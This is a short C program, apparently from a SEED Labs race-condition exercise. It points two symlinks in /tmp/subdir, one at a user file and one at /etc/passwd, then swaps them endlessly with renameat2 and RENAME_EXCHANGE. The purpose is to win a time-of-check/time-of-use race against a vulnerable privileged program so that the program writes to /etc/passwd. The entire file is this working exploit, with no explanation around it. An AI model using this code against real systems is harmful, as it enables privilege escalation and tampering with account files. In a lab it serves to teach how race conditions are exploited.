#include <unistd.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <linux/fs.h>

int main()
{
	unsigned int flags = RENAME_EXCHANGE;
	
	unlink("/tmp/subdir/XYZ"); 
	symlink("/home/seed/race_cond/myfile", "/tmp/subdir/XYZ");
	unlink("/tmp/subdir/ABC");
	symlink("/etc/passwd", "/tmp/subdir/ABC");

	while(1) {
		syscall(SYS_renameat2, 0, "/tmp/subdir/XYZ", 0, "/tmp/subdir/ABC", flags);
		usleep(10000);
	}

	return 0;
}
